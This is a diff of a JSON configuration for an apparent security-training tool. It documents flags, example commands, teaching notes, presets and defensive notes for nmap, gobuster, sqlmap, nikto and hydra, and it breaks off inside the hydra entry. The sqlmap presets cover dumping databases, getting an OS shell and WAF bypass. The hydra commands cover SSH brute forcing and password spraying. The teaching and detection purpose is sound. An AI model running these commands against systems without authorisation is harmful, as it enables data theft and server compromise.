@@ -8,139 +8,987 @@
     "default_flags": ["-sV", "--top-ports", "1000"],
     "default_command": "nmap -sV --top-ports 1000 {target}",
     "flags": {
-      "-sV": {
-        "label": "Version Detection",
-        "desc": "Probe open ports to determine the service name and version number. Essential — version info reveals CVEs.",
-        "example": "nmap -sV 192.168.1.1",
-        "teach": "Version detection sends additional probes after discovering open ports. A port showing 'Apache 2.4.29' immediately tells you to check CVE databases for that specific version.",
-        "risk": "noisy"
-      },
-      "-sC": {
-        "label": "Default Scripts",
-        "desc": "Run Nmap's default NSE scripts. Checks for common vulns, grabs banners, enumerates services automatically.",
-        "example": "nmap -sC 192.168.1.1",
-        "teach": "NSE (Nmap Scripting Engine) scripts are mini-programs that run against open ports. Default scripts grab banners, detect vulns, enumerate SMB shares, and more — all automatically.",
-        "risk": "noisy"
-      },
-      "-sS": {
-        "label": "SYN Stealth Scan",
-        "desc": "Half-open TCP scan. Never completes the handshake — faster and harder to detect than full connect scan.",
-        "example": "nmap -sS 192.168.1.1",
-        "teach": "SYN scan sends a SYN packet and waits. Open ports reply SYN-ACK, closed ports reply RST. We never send the final ACK — the connection never fully opens, leaving fewer logs.",
-        "risk": "requires_root"
-      },
-      "-sU": {
-        "label": "UDP Scan",
-        "desc": "Scan UDP ports. Finds DNS (53), SNMP (161), TFTP (69), NTP (123) — often overlooked by defenders.",
-        "example": "nmap -sU --top-ports 100 192.168.1.1",
-        "teach": "UDP is connectionless so scanning is slower. ICMP 'port unreachable' = closed. No response = open|filtered. SNMP (161) is a goldmine — often misconfigured with 'public' community string.",
-        "risk": "slow"
-      },
-      "-O": {
-        "label": "OS Detection",
-        "desc": "Identify the operating system via TCP/IP fingerprinting. Narrows exploit selection dramatically.",
-        "example": "nmap -O 192.168.1.1",
-        "teach": "OS detection analyzes subtle differences in how operating systems respond to unusual packet combinations. Knowing it's Windows Server 2019 vs Ubuntu 20.04 changes your entire attack path.",
-        "risk": "requires_root"
-      },
-      "-A": {
-        "label": "Aggressive Scan",
-        "desc": "Enables OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute. All-in-one.",
-        "example": "nmap -A 192.168.1.1",
-        "teach": "The -A flag is the Swiss Army knife — it's louder but gives maximum intel in one shot. Great for CTFs and internal assessments where stealth isn't a priority.",
-        "risk": "very_noisy"
-      },
-      "-p-": {
-        "label": "All Ports",
-        "desc": "Scan all 65535 ports. Default only scans top 1000. Services on non-standard ports hide here.",
-        "example": "nmap -p- 192.168.1.1",
-        "teach": "Admins often move services to non-standard ports thinking it adds security (security through obscurity). An SSH on port 2222, RDP on 3399, or a web admin on 8888 would be missed without -p-.",
-        "risk": "slow"
-      },
-      "-p": {
-        "label": "Port Range",
-        "desc": "Specify exact ports or ranges: -p 22,80,443 or -p 1-1024",
-        "example": "nmap -p 22,80,443,8080,8443 192.168.1.1",
-        "teach": "Targeted port scanning is faster and quieter. Use when you already know what services to look for, or want to quickly verify if a specific service is running.",
-        "risk": "quiet"
-      },
-      "--script": {
-        "label": "NSE Script",
-        "desc": "Run specific Nmap scripts: vuln, smb-vuln-ms17-010, http-title, ftp-anon, etc.",
-        "example": "nmap --script smb-vuln-ms17-010 192.168.1.1",
-        "teach": "NSE scripts are Lua programs. smb-vuln-ms17-010 checks for EternalBlue. ftp-anon checks for anonymous FTP login. http-enum discovers web paths. You can chain: --script vuln,discovery",
-        "risk": "depends_on_script"
-      },
-      "--top-ports": {
-        "label": "Top N Ports",
-        "desc": "Scan the N most commonly open ports. --top-ports 1000 covers 99% of real-world services.",
-        "example": "nmap --top-ports 1000 192.168.1.1",
-        "teach": "Nmap has a database of port frequency based on real-world internet scans. Top 100 ports covers ~80% of services, top 1000 covers ~99%. Balances speed vs coverage.",
-        "risk": "quiet"
-      },
-      "-T4": {
-        "label": "Timing Template T4",
-        "desc": "Aggressive timing — faster scans on reliable networks. T0=paranoid (slowest) to T5=insane (fastest).",
-        "example": "nmap -T4 192.168.1.1",
-        "teach": "Timing templates control packet rate. T1-T2 are for IDS evasion (very slow). T3 is default. T4 is faster for reliable LAN. T5 can miss results. Never use T5 in production.",
-        "risk": "noisy"
-      },
-      "-oN": {
-        "label": "Normal Output",
-        "desc": "Save results to a file in normal human-readable format for your report.",
-        "example": "nmap -oN scan_results.txt 192.168.1.1",
-        "teach": "Always save your output! -oN = normal text, -oX = XML (for parsing), -oG = grepable, -oA = all formats at once. You'll need this for your report and for evidence.",
-        "risk": "safe"
-      },
-      "-oX": {
-        "label": "XML Output",
-        "desc": "Save results as XML — can be imported into Metasploit, Dradis, and other tools.",
-        "example": "nmap -oX scan.xml 192.168.1.1",
-        "teach": "XML output is machine-readable. Metasploit can import nmap XML directly: db_import scan.xml — this populates your Metasploit database with all hosts and services automatically.",
-        "risk": "safe"
-      },
-      "--open": {
-        "label": "Show Open Only",
-        "desc": "Only display open ports in output. Cleaner results on large network scans.",
-        "example": "nmap --open 192.168.1.0/24",
-        "teach": "On large subnet scans, you'll get hundreds of 'closed' results that don't matter. --open filters the noise so you only see actionable findings.",
-        "risk": "safe"
-      },
-      "-v": {
-        "label": "Verbose",
-        "desc": "Increase verbosity — shows results as they come in rather than waiting for scan to finish.",
-        "example": "nmap -v 192.168.1.1",
-        "teach": "With -v you see open ports appear in real time as nmap discovers them. Great for long scans — you can start working on early discoveries while the scan continues.",
-        "risk": "safe"
-      }
+      "-sV": { "label": "Version Detection", "desc": "Probe open ports to determine service name and version. Essential — version info reveals CVEs.", "example": "nmap -sV 192.168.1.1", "teach": "Version detection sends extra probes after finding open ports. 'Apache 2.4.29' immediately points you to searchsploit and NVD.", "risk": "noisy" },
+      "-sC": { "label": "Default Scripts", "desc": "Run Nmap's default NSE scripts. Grabs banners, enumerates services, checks for common vulns automatically.", "example": "nmap -sC 192.168.1.1", "teach": "NSE scripts are Lua programs that run against open ports. Default scripts do banner grabbing, SMB enumeration, FTP anonymous check, and more.", "risk": "noisy" },
+      "-sS": { "label": "SYN Stealth Scan", "desc": "Half-open TCP scan. Never completes the handshake — faster and harder to detect.", "example": "nmap -sS 192.168.1.1", "teach": "SYN scan sends SYN, waits for SYN-ACK (open) or RST (closed). We never send the final ACK — leaves fewer logs.", "risk": "requires_root" },
+      "-sU": { "label": "UDP Scan", "desc": "Scan UDP ports. Finds DNS (53), SNMP (161), TFTP (69), NTP (123) — often missed.", "example": "nmap -sU --top-ports 100 192.168.1.1", "teach": "UDP is connectionless — no response usually means open|filtered. SNMP port 161 with 'public' community string is a goldmine.", "risk": "slow" },
+      "-O": { "label": "OS Detection", "desc": "Identify the OS via TCP/IP fingerprinting. Narrows exploit selection dramatically.", "example": "nmap -O 192.168.1.1", "teach": "OS detection analyzes subtle packet response differences. Windows Server vs Ubuntu changes your entire attack path.", "risk": "requires_root" },
+      "-A": { "label": "Aggressive Scan", "desc": "OS detection + version + scripts + traceroute. All-in-one.", "example": "nmap -A 192.168.1.1", "teach": "-A is the Swiss Army knife. Louder but gives max intel in one shot. Great for CTFs and internal assessments.", "risk": "very_noisy" },
+      "-p-": { "label": "All 65535 Ports", "desc": "Scan every port. Default only scans top 1000. Services on non-standard ports hide here.", "example": "nmap -p- 192.168.1.1", "teach": "Admins move services to weird ports thinking it's security. SSH on 2222, RDP on 3399, admin panel on 8888 — all missed without -p-.", "risk": "slow" },
+      "-p": { "label": "Port Range", "desc": "Specify exact ports or ranges: -p 22,80,443 or -p 1-1024", "example": "nmap -p 22,80,443,8080 192.168.1.1", "teach": "Targeted scanning is faster and quieter. Use when you know what services to expect.", "risk": "quiet" },
+      "--script": { "label": "NSE Script", "desc": "Run specific scripts: vuln, smb-vuln-ms17-010, http-title, ftp-anon, etc.", "example": "nmap --script smb-vuln-ms17-010 192.168.1.1", "teach": "smb-vuln-ms17-010 checks EternalBlue. ftp-anon checks anonymous FTP. http-enum finds web paths. Chain them: --script vuln,discovery", "risk": "depends_on_script" },
+      "--top-ports": { "label": "Top N Ports", "desc": "Scan N most commonly open ports. --top-ports 1000 covers 99% of real services.", "example": "nmap --top-ports 1000 192.168.1.1", "teach": "Nmap's port frequency database comes from real internet scans. Top 1000 covers ~99% of services in the wild.", "risk": "quiet" },
+      "-T4": { "label": "Timing T4 (Fast)", "desc": "Aggressive timing for reliable networks. T0=paranoid to T5=insane.", "example": "nmap -T4 192.168.1.1", "teach": "T1-T2 for IDS evasion. T3 default. T4 for fast LAN. T5 can miss results. Never T5 in production.", "risk": "noisy" },
+      "-oN": { "label": "Normal Output File", "desc": "Save results to a human-readable file for your report.", "example": "nmap -oN scan.txt 192.168.1.1", "teach": "Always save output! -oN normal, -oX XML (for Metasploit import), -oG grepable, -oA all formats.", "risk": "safe" },
+      "--open": { "label": "Show Open Only", "desc": "Only display open ports. Cleaner results on large subnet scans.", "example": "nmap --open 192.168.1.0/24", "teach": "Large subnet scans return hundreds of 'closed' results. --open filters noise so you only see actionable findings.", "risk": "safe" },
+      "-v": { "label": "Verbose", "desc": "Show results in real time as they're discovered.", "example": "nmap -v 192.168.1.1", "teach": "With -v you see open ports appear live. Start working on early discoveries while the scan continues.", "risk": "safe" }
     },
     "preset_profiles": {
-      "Quick Recon": {
-        "flags": ["-sV", "--top-ports", "100", "-T4"],
-        "desc": "Fast top-100 port sweep with version detection. Good for initial target survey."
-      },
-      "Full Recon": {
-        "flags": ["-sV", "-sC", "--top-ports", "1000"],
-        "desc": "Service versions + default NSE scripts. The professional standard."
-      },
-      "Stealth SYN": {
-        "flags": ["-sS", "-T2", "--top-ports", "1000"],
-        "desc": "Half-open scan with slow timing. Lower IDS detection probability."
-      },
-      "Aggressive All": {
-        "flags": ["-A", "-p-"],
-        "desc": "All ports + OS + scripts + traceroute. Maximum intel, maximum noise."
-      },
-      "SMB Hunter": {
-        "flags": ["-p", "139,445", "--script", "smb-vuln-ms17-010,smb-enum-shares,smb-os-discovery"],
-        "desc": "Hunt for EternalBlue and SMB misconfigs specifically."
-      },
-      "Web App": {
-        "flags": ["-p", "80,443,8080,8443,8888", "-sV", "--script", "http-title,http-headers,http-methods"],
-        "desc": "Web-focused scan with HTTP enumeration scripts."
-      }
+      "Quick Recon":   { "flags": ["-sV", "--top-ports", "100", "-T4"], "desc": "Fast top-100 port sweep with version detection." },
+      "Full Recon":    { "flags": ["-sV", "-sC", "--top-ports", "1000"], "desc": "Service versions + default NSE scripts. Professional standard." },
+      "Stealth SYN":   { "flags": ["-sS", "-T2", "--top-ports", "1000"], "desc": "Half-open scan, slow timing. Lower IDS detection." },
+      "Aggressive All":{ "flags": ["-A", "-p-"], "desc": "All ports + OS + scripts + traceroute. Max intel, max noise." },
+      "SMB Hunter":    { "flags": ["-p", "139,445", "--script", "smb-vuln-ms17-010,smb-enum-shares,smb-os-discovery"], "desc": "Hunt EternalBlue and SMB misconfigs." },
+      "Web App":       { "flags": ["-p", "80,443,8080,8443,8888", "-sV", "--script", "http-title,http-headers,http-methods"], "desc": "Web-focused scan with HTTP enumeration." }
     },
-    "defend_notes": "From a blue team perspective: Nmap SYN scans generate RST packets visible in firewall logs. Full connect scans appear in web server access logs. Version detection produces unusual banner grabs. Configure your SIEM to alert on port sweeps (single source → multiple destinations in short window). Tools like Snort/Suricata have Nmap detection signatures built in.",
+    "defend_notes": "SYN scans generate RST packets visible in firewall logs. Full connect scans appear in web server access logs. Configure SIEM to alert on port sweeps (single source → multiple destinations in short window). Snort/Suricata have Nmap detection signatures built in.",
     "mitre_techniques": ["T1046 - Network Service Discovery", "T1595.001 - Active Scanning: Scanning IP Blocks"]
+  },
+
+  "gobuster": {
+    "name": "Gobuster",
+    "binary": "gobuster",
+    "category": "web",
+    "description": "Directory, file, DNS subdomain, and vhost brute forcer. Threaded, fast, and wordlist-driven. One of the first tools to run against any web target after identifying HTTP/HTTPS ports.",
+    "teach_intro": "Gobuster sends HTTP requests for every word in your wordlist and records which ones get non-404 responses. It's fast because it runs dozens of threads simultaneously. Hidden directories, admin panels, backup files, and API endpoints all hide here.",
+    "default_flags": ["dir", "-u", "http://{target}", "-w", "/usr/share/wordlists/dirb/common.txt", "-t", "20"],
+    "default_command": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 20",
+    "flags": {
+      "dir":    { "label": "Directory Mode", "desc": "Enumerate directories and files on a web server.", "example": "gobuster dir -u http://target.com -w common.txt", "teach": "dir mode is the workhorse. Finds /admin, /backup, /.git, /api — all the things devs forgot to protect.", "risk": "noisy" },
+      "dns":    { "label": "DNS Subdomain Mode", "desc": "Enumerate subdomains by brute forcing DNS. Finds dev, staging, api, admin subdomains.", "example": "gobuster dns -d target.com -w subdomains.txt", "teach": "DNS mode resolves each subdomain. dev.target.com might be running a debug build. mail.target.com reveals mail infra.", "risk": "quiet" },
+      "vhost":  { "label": "Virtual Host Mode", "desc": "Enumerate virtual hosts on a web server. Finds hidden vhosts that don't appear in DNS.", "example": "gobuster vhost -u http://target.com -w vhosts.txt", "teach": "Some vhosts only respond to the right Host: header. Internal admin panels often live as vhosts on the same IP.", "risk": "noisy" },
+      "-w":     { "label": "Wordlist", "desc": "Path to wordlist. Use dirb/common.txt (small/fast) or dirbuster/directory-list-2.3-medium.txt (thorough).", "example": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "teach": "Wordlist choice matters. common.txt is 4600 words. medium.txt is 220k words. Start small, escalate.", "risk": "safe" },
+      "-t":     { "label": "Thread Count", "desc": "Number of concurrent threads. Default 10, safe max ~50 for most servers.", "example": "gobuster dir -u http://target.com -w list.txt -t 50", "teach": "More threads = faster scan but more server load and more log entries. -t 10 is stealthy, -t 50 is aggressive.", "risk": "noisy" },
+      "-x":     { "label": "File Extensions", "desc": "Add file extension checks: -x php,html,txt,bak,zip", "example": "gobuster dir -u http://target.com -w common.txt -x php,bak,zip", "teach": "Extensions unlock backup files. config.php.bak, admin.php, robots.txt.bak — devs leave these everywhere.", "risk": "noisy" },
+      "-s":     { "label": "Status Codes", "desc": "Only show specific HTTP status codes. Default: 200,204,301,302,307,401,403.", "example": "gobuster dir -u http://target.com -w list.txt -s 200,301,403", "teach": "403 Forbidden means the path EXISTS but you're denied. A 403 is almost as interesting as a 200 — try bypass techniques.", "risk": "safe" },
+      "-k":     { "label": "Skip TLS Verify", "desc": "Skip SSL certificate verification. Required for self-signed certs on HTTPS targets.", "example": "gobuster dir -u https://target.com -w list.txt -k", "teach": "Most internal HTTPS services use self-signed certs. Without -k gobuster refuses to connect.", "risk": "safe" },
+      "-o":     { "label": "Output File", "desc": "Save results to a file.", "example": "gobuster dir -u http://target.com -w list.txt -o results.txt", "teach": "Always save output. You'll reference these paths for follow-up requests and report evidence.", "risk": "safe" },
+      "--cookies": { "label": "Session Cookies", "desc": "Include cookies for authenticated scanning behind a login.", "example": "gobuster dir -u http://target.com -w list.txt --cookies 'PHPSESSID=abc123'", "teach": "Without cookies gobuster only sees the unauthenticated surface. Add your session cookie to scan the post-login app.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Quick Dir":     { "flags": ["dir", "-u", "http://{target}", "-w", "/usr/share/wordlists/dirb/common.txt", "-t", "20"], "desc": "Fast common directory sweep." },
+      "Deep Dir":      { "flags": ["dir", "-u", "http://{target}", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "-t", "40", "-x", "php,html,txt,bak"], "desc": "Thorough directory + extension scan." },
+      "DNS Subs":      { "flags": ["dns", "-d", "{target}", "-w", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"], "desc": "Subdomain enumeration with top 5k wordlist." },
+      "Auth Scan":     { "flags": ["dir", "-u", "http://{target}", "-w", "/usr/share/wordlists/dirb/common.txt", "-t", "20", "--cookies", "PHPSESSID=REPLACE_ME"], "desc": "Authenticated directory scan — replace cookie." }
+    },
+    "defend_notes": "Gobuster generates huge volumes of 404s rapidly from one IP. WAFs and IDS detect this pattern immediately. Configure rate limiting on web servers. Alert on >100 requests/minute from a single IP returning 404. Cloudflare and fail2ban both catch this by default.",
+    "mitre_techniques": ["T1083 - File and Directory Discovery", "T1595.003 - Active Scanning: Wordlist Scanning"]
+  },
+
+  "sqlmap": {
+    "name": "SQLMap",
+    "binary": "sqlmap",
+    "category": "web",
+    "description": "The ultimate automated SQL injection detection and exploitation tool. Tests every injection technique (UNION, blind, error-based, time-based, stacked queries) and can dump entire databases, crack hashes, and even get OS shells.",
+    "teach_intro": "SQL injection tricks the database into running your SQL instead of the app's. SQLMap automates the tedious process of testing every parameter. When it finds injection, it can list databases, tables, and dump all data — up to and including password hashes and OS access.",
+    "default_flags": ["-u", "{target}", "--batch", "--dbs", "--level=1", "--risk=1"],
+    "default_command": "sqlmap -u '{target}' --batch --dbs",
+    "flags": {
+      "-u":          { "label": "Target URL", "desc": "The URL to test. Include the parameter: http://target.com/page?id=1", "example": "sqlmap -u 'http://target.com/page?id=1'", "teach": "SQLMap tests the id=1 parameter. Every GET/POST parameter is a potential injection point.", "risk": "noisy" },
+      "--batch":     { "label": "Non-Interactive", "desc": "Accept default answers to all prompts. Essential for automation.", "example": "sqlmap -u 'http://target.com/page?id=1' --batch", "teach": "--batch makes sqlmap run without pausing to ask questions. Always use this for speed.", "risk": "safe" },
+      "--dbs":       { "label": "List Databases", "desc": "Enumerate all databases on the server after confirming injection.", "example": "sqlmap -u 'http://target.com/page?id=1' --batch --dbs", "teach": "After finding injection, --dbs shows all databases. Look for: customers, users, wordpress, accounting, hr.", "risk": "noisy" },
+      "-D":          { "label": "Select Database", "desc": "Target a specific database: -D database_name --tables", "example": "sqlmap -u 'http://target.com/page?id=1' -D users --tables", "teach": "After seeing database names with --dbs, use -D to drill into one. --tables then shows all tables inside.", "risk": "noisy" },
+      "-T":          { "label": "Select Table", "desc": "Target a specific table: -D db_name -T table_name --dump", "example": "sqlmap -u 'http://target.com/page?id=1' -D users -T accounts --dump", "teach": "--dump extracts every row from the table. user + password_hash = crackable with hashcat.", "risk": "very_noisy" },
+      "--dump":      { "label": "Dump Table Data", "desc": "Extract all rows from the selected table.", "example": "sqlmap -u 'http://target.com/page?id=1' -D users -T accounts --dump", "teach": "Dump gives you raw data. SQLMap auto-detects hash types and offers to crack them with a wordlist.", "risk": "very_noisy" },
+      "--dump-all":  { "label": "Dump Everything", "desc": "Dump ALL tables from ALL databases. Comprehensive but loud.", "example": "sqlmap -u 'http://target.com/page?id=1' --dump-all", "teach": "Nuclear option — extracts everything. Excellent for evidence collection but extremely loud and slow.", "risk": "very_noisy" },
+      "--level":     { "label": "Test Level (1-5)", "desc": "How many tests to run. Level 1=basic, 5=maximum (headers, cookies, user-agent).", "example": "sqlmap -u 'http://target.com/page?id=1' --level=3", "teach": "Level 1 tests URL params. Level 3 tests cookies. Level 5 tests everything including HTTP headers. More levels = more detection risk.", "risk": "noisy" },
+      "--risk":      { "label": "Risk Level (1-3)", "desc": "How risky the tests are. Risk 3 includes UPDATE statements that could modify data.", "example": "sqlmap -u 'http://target.com/page?id=1' --risk=2", "teach": "Risk 3 sends UPDATE/DELETE payloads that can corrupt data. Only use on targets you have explicit permission to test.", "risk": "depends_on_script" },
+      "--forms":     { "label": "Test All Forms", "desc": "Automatically parse and test all HTML forms on the page.", "example": "sqlmap -u 'http://target.com/login' --forms --batch", "teach": "Login forms, search boxes, contact forms — all are injection candidates. --forms finds and tests them all automatically.", "risk": "noisy" },
+      "--data":      { "label": "POST Data", "desc": "Test POST parameters: --data='username=admin&password=test'", "example": "sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'", "teach": "POST parameters are common injection points in login forms. SQLMap tests them identically to GET params.", "risk": "noisy" },
+      "--cookie":    { "label": "Cookie", "desc": "Include session cookie for authenticated scanning.", "example": "sqlmap -u 'http://target.com/profile?id=1' --cookie='PHPSESSID=abc123'", "teach": "Many injection points are only accessible post-login. Add your session cookie to test authenticated endpoints.", "risk": "noisy" },
+      "--os-shell":  { "label": "OS Shell", "desc": "Attempt to get an OS-level interactive shell via the database server.", "example": "sqlmap -u 'http://target.com/page?id=1' --os-shell", "teach": "If MySQL runs as root or MSSQL as sa, --os-shell gives you command execution on the server OS. This is full compromise.", "risk": "very_noisy" },
+      "--passwords": { "label": "Dump DB Passwords", "desc": "Extract database user credentials and hashes.", "example": "sqlmap -u 'http://target.com/page?id=1' --passwords", "teach": "Database users have their own password hashes. DBA accounts often reuse passwords across systems.", "risk": "very_noisy" },
+      "--tamper":    { "label": "Tamper Script", "desc": "Apply WAF bypass tamper scripts: space2comment, between, charencode.", "example": "sqlmap -u 'http://target.com/page?id=1' --tamper=space2comment,between", "teach": "WAFs block 'SELECT FROM'. Tamper scripts mangle the payload so it still works but bypasses filters. space2comment replaces spaces with /**/.", "risk": "noisy" },
+      "--tor":       { "label": "Route via Tor", "desc": "Route SQLMap traffic through Tor network for anonymity.", "example": "sqlmap -u 'http://target.com/page?id=1' --tor --tor-type=SOCKS5", "teach": "Tor routes through multiple relays making source IP attribution very difficult. Slower but harder to trace.", "risk": "quiet" }
+    },
+    "preset_profiles": {
+      "Detect Only":    { "flags": ["-u", "'{target}'", "--batch", "--level=1", "--risk=1"], "desc": "Safe detection pass — no data extracted." },
+      "Full Dump":      { "flags": ["-u", "'{target}'", "--batch", "--dump-all", "--level=2"], "desc": "Detect and dump everything — thorough." },
+      "WAF Bypass":     { "flags": ["-u", "'{target}'", "--batch", "--tamper=space2comment,between,charencode", "--level=3"], "desc": "Aggressive WAF evasion tamper chain." },
+      "POST Login Form":{ "flags": ["-u", "'{target}'", "--forms", "--batch", "--level=2"], "desc": "Auto-test all POST forms on the page." },
+      "OS Shell Hunt":  { "flags": ["-u", "'{target}'", "--batch", "--os-shell", "--level=3", "--risk=3"], "desc": "Attempt OS code execution — use with caution." }
+    },
+    "defend_notes": "SQL injection attacks generate distinctive WAF log entries and database error messages. Enable parameterized queries (prepared statements) — the only real fix. WAF rules for UNION/SELECT/DROP patterns catch script kiddie attacks but tamper scripts bypass them. Monitor for unusual database query patterns in your SIEM. SQLMap's time-based blind attacks show as slow queries.",
+    "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1059.004 - Command and Scripting Interpreter: Unix Shell"]
+  },
+
+  "nikto": {
+    "name": "Nikto",
+    "binary": "nikto",
+    "category": "web",
+    "description": "Web server vulnerability scanner. Tests for 6700+ potentially dangerous files, outdated server software, version-specific problems, and server configuration issues. Fast passive reconnaissance against any HTTP/HTTPS target.",
+    "teach_intro": "Nikto checks web servers against a database of known vulnerabilities, dangerous files, and misconfigurations. It's noisy but thorough — every '+' line in the output is a potential finding. Think of it as the first scanner you run against a web target before going deeper.",
+    "default_flags": ["-h", "{target}"],
+    "default_command": "nikto -h {target}",
+    "flags": {
+      "-h":      { "label": "Target Host", "desc": "Target hostname or IP. Add port with -p if not 80/443.", "example": "nikto -h 192.168.1.1", "teach": "Every scan starts here. Nikto will probe the host on port 80 by default. Add -ssl for HTTPS.", "risk": "noisy" },
+      "-p":      { "label": "Port", "desc": "Specify port number if not default 80/443.", "example": "nikto -h 192.168.1.1 -p 8080", "teach": "Many apps run on 8080, 8443, 8888, or 9000. Always specify the correct port or you'll scan the wrong service.", "risk": "safe" },
+      "-ssl":    { "label": "Force SSL/HTTPS", "desc": "Force SSL connection. Use for HTTPS targets.", "example": "nikto -h target.com -ssl", "teach": "Without -ssl on an HTTPS target nikto will fail to connect. Always pair with HTTPS targets.", "risk": "safe" },
+      "-Tuning": { "label": "Scan Tuning", "desc": "Filter test categories. 1=files,2=misconfig,3=info,4=injection,6=DOS,x=all.", "example": "nikto -h target.com -Tuning 1234", "teach": "Tuning lets you focus on specific vulnerability classes. -Tuning 4 only tests injection points. Reduces noise for targeted recon.", "risk": "safe" },
+      "-o":      { "label": "Output File", "desc": "Save results. Format detected by extension: .txt .html .xml .csv", "example": "nikto -h target.com -o nikto_results.html", "teach": "HTML output is easiest to read and share. XML output can be imported into other tools.", "risk": "safe" },
+      "-Format": { "label": "Output Format", "desc": "Explicitly set output format: htm, csv, txt, xml, msf+.", "example": "nikto -h target.com -o results.xml -Format xml", "teach": "msf+ format outputs Metasploit resource script — auto-feeds findings into MSF for exploitation.", "risk": "safe" },
+      "-evasion":{ "label": "IDS Evasion", "desc": "Evasion techniques: 1=random URI encoding, 2=dir self-ref, 3=premature URL ending.", "example": "nikto -h target.com -evasion 1", "teach": "Evasion techniques mangle requests to bypass IDS signatures. Not reliable against modern WAFs but useful against legacy systems.", "risk": "quiet" },
+      "-id":     { "label": "Authentication", "desc": "Use HTTP authentication: -id user:password", "example": "nikto -h target.com -id admin:password", "teach": "If the target uses HTTP Basic Auth, supply credentials with -id. Without this you only see the unauthenticated surface.", "risk": "safe" },
+      "-useproxy":{ "label": "Use Proxy", "desc": "Route through proxy: -useproxy http://127.0.0.1:8080 (Burp Suite)", "example": "nikto -h target.com -useproxy http://127.0.0.1:8080", "teach": "Routing through Burp Suite lets you see exactly what Nikto sends and intercept/replay interesting requests.", "risk": "safe" },
+      "-timeout":{ "label": "Timeout", "desc": "Seconds before giving up on a request. Default 10.", "example": "nikto -h target.com -timeout 20", "teach": "Slow servers or high latency targets need a higher timeout. Too low and you miss findings.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Basic Scan":     { "flags": ["-h", "{target}"], "desc": "Standard Nikto scan on port 80." },
+      "HTTPS Scan":     { "flags": ["-h", "{target}", "-ssl", "-p", "443"], "desc": "HTTPS target scan." },
+      "Full Tuning":    { "flags": ["-h", "{target}", "-Tuning", "x"], "desc": "Run ALL test categories." },
+      "Inject Focus":   { "flags": ["-h", "{target}", "-Tuning", "4"], "desc": "Focus only on injection tests." },
+      "Save HTML":      { "flags": ["-h", "{target}", "-o", "nikto_report.html", "-Format", "htm"], "desc": "Full scan with HTML report output." }
+    },
+    "defend_notes": "Nikto is extremely loud — it fires thousands of requests including scans for known malicious paths. Web server logs will show massive 404 floods from a single IP. A WAF will flag this immediately. Alert on request volume thresholds. Nikto doesn't respect robots.txt so that path will appear in access logs.",
+    "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1595.002 - Active Scanning: Vulnerability Scanning"]
+  },
+
+  "hydra": {
+    "name": "Hydra",
+    "binary": "hydra",
+    "category": "credentials",
+    "description": "Fast and flexible online password brute forcing tool. Supports 50+ protocols: SSH, FTP, HTTP, SMTP, SMB, RDP, MySQL, PostgreSQL, VNC, and more. The industry standard for credential attacks against network services.",
+    "teach_intro": "Hydra works by trying username/password combinations against a live service as fast as the network allows. It's online brute forcing — you need network access to the target. Results mean valid live credentials you can use right now. Always have permission before running this.",
+    "default_flags": ["-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt", "{target}", "ssh"],
+    "default_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
+    "flags": {
+      "-l":  { "label": "Single Username", "desc": "Test a single username: -l admin", "example": "hydra -l admin -P rockyou.txt 192.168.1.1 ssh", "teach": "Start with common admin usernames: admin, root, administrator, user, test. Often one hits.", "risk": "noisy" },
+      "-L":  { "label": "Username List", "desc": "Test a list of usernames from file: -L users.txt", "example": "hydra -L users.txt -P rockyou.txt 192.168.1.1 ssh", "teach": "Get usernames from OSINT (LinkedIn, email harvesting), LDAP enumeration, or default credential lists.", "risk": "very_noisy" },
+      "-p":  { "label": "Single Password", "desc": "Test a single password against all usernames. Good for password spray.", "example": "hydra -L users.txt -p 'Winter2024!' 192.168.1.1 ssh", "teach": "Password spray: try one common password against many accounts. Avoids lockouts. 'Password1!', 'CompanyName2024!' are typical hits.", "risk": "quiet" },
+      "-P":  { "label": "Password List", "desc": "Wordlist file: -P /usr/share/wordlists/rockyou.txt", "example": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh", "teach": "rockyou.txt has 14 million real-world leaked passwords. Most people use passwords that appear in it.", "risk": "very_noisy" },
+      "-t":  { "label": "Threads", "desc": "Parallel tasks per target host. Default 16.", "example": "hydra -l admin -P rockyou.txt -t 4 192.168.1.1 ssh", "teach": "SSH limits connections and may lockout accounts. Use -t 4 for SSH to avoid triggering fail2ban. HTTP can handle -t 64.", "risk": "noisy" },
+      "-f":  { "label": "Stop on First Hit", "desc": "Stop attacking when the first valid credential is found.", "example": "hydra -l admin -P rockyou.txt -f 192.168.1.1 ssh", "teach": "-f saves time and reduces noise once you have working creds. Always use -f in real engagements.", "risk": "safe" },
+      "-s":  { "label": "Custom Port", "desc": "Specify non-standard port: -s 2222 for SSH on port 2222.", "example": "hydra -l admin -P rockyou.txt -s 2222 192.168.1.1 ssh", "teach": "SSH moved to 2222, HTTP on 8080, FTP on 2121 — always check with nmap first then set the right port.", "risk": "safe" },
+      "-V":  { "label": "Verbose Mode", "desc": "Show every login attempt. Verbose output for monitoring progress.", "example": "hydra -l admin -P rockyou.txt -V 192.168.1.1 ssh", "teach": "Verbose mode shows each attempt: [22][ssh] host: ... login: admin password: test. Good for watching live progress.", "risk": "safe" },
+      "-o":  { "label": "Output File", "desc": "Save found credentials to a file.", "example": "hydra -l admin -P rockyou.txt -o hydra_results.txt 192.168.1.1 ssh", "teach": "Always save credentials. You'll need them for your report, and to reuse across other services on the network.", "risk": "safe" },
+      "-e":  { "label": "Extra Checks", "desc": "Try: n=null password, s=same as login, r=reversed login.", "example": "hydra -l admin -P rockyou.txt -e nsr 192.168.1.1 ssh", "teach": "-e nsr checks empty password, password=username, and reversed username. Catches lazy admins fast.", "risk": "noisy" },
+      "-x":  { "label": "Password Generator", "desc": "Generate passwords on the fly: -x MIN:MAX:CHARSET", "example": "hydra -l admin -x 4:6:aA1 192.168.1.1 ssh", "teach": "Generates all combos of lowercase+uppercase+digits between 4-6 chars. For PIN brute force: -x 4:4:1234567890", "risk": "very_noisy" },
